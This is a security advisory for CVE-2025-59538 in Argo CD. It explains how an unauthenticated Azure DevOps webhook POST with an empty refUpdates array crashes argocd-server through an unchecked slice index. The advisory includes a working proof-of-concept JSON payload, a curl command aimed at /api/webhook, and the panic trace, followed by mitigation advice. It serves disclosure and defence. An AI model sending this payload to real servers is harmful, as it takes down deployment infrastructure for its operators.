# Argo CD Unauthenticated Remote DoS via malformed Azure DevOps git.push webhook

**GHSA**: GHSA-gpx4-37g2-c8pv | **CVE**: CVE-2025-59538 | **Severity**: high (CVSS 7.5)

**CWE**: CWE-248, CWE-703

**Affected Packages**:
- **github.com/argoproj/argo-cd/v2** (go): >= 2.9.0-rc1, <= 2.14.19
- **github.com/argoproj/argo-cd/v3** (go): = 3.2.0-rc1
- **github.com/argoproj/argo-cd/v3** (go): >= 3.1.0-rc1, <= 3.1.7
- **github.com/argoproj/argo-cd/v3** (go): >= 3.0.0-rc1, <= 3.0.18

## Description

### Summary

In the default configuration, `webhook.azuredevops.username` and `webhook.azuredevops.password` not set, Argo CD’s /api/webhook endpoint crashes the entire argocd-server process when it receives an Azure DevOps Push event whose JSON array resource.refUpdates is empty.

The slice index [0] is accessed without a length check, causing an index-out-of-range panic.

A single unauthenticated HTTP POST is enough to kill the process.

### Details

```go
case azuredevops.GitPushEvent:
    // util/webhook/webhook.go -- line ≈147
    revision        = ParseRevision(payload.Resource.RefUpdates[0].Name)        // panics if slice empty
    change.shaAfter = ParseRevision(payload.Resource.RefUpdates[0].NewObjectID)
    change.shaBefore= ParseRevision(payload.Resource.RefUpdates[0].OldObjectID)
    touchedHead     = payload.Resource.RefUpdates[0].Name ==
                      payload.Resource.Repository.DefaultBranch
```

If the attacker supplies "refUpdates": [], the slice has length 0.

The webhook code has no recover(), so the panic terminates the entire binary.

### PoC

payload-azure-empty.json:
```json
{
  "eventType": "git.push",
  "resource": {
    "refUpdates": [],
    "repository": {
      "remoteUrl": "https://example.com/dummy",
      "defaultBranch": "refs/heads/master"
    }
  }
}
```

curl call:

```shell
curl -k -X POST https://argocd.example.com/api/webhook \
     -H 'X-Vss-ActivityId: 11111111-1111-1111-1111-111111111111' \
     -H 'Content-Type: application/json' \
     --data-binary @payload-azure-empty.json
```

Observed crash:

```
panic: runtime error: index out of range [0] with length 0

goroutine 205 [running]:
github.com/argoproj/argo-cd/v3/util/webhook.affectedRevisionInfo
    webhook.go:147 +0x1ea5
...
```

### Mitigation

If you use Azure DevOps and need to handle webhook events, configure a webhook secret to ensure only trusted parties can invoke the webhook handler.

If you do not use Azure DevOps, you can set the webhook secrets to long, random values to effectively disable webhook handling for Azure DevOps payloads.

```diff
apiVersion: v1
kind: Secret
metadata:
  name: argocd-secret
type: Opaque
data:
+  webhook.azuredevops.username: <your base64-encoded secret here>
+  webhook.azuredevops.password: <your base64-encoded secret here>
```

### For more information

* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)
* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd

### Credits

Discovered by Jakub Ciolek at AlphaSense.
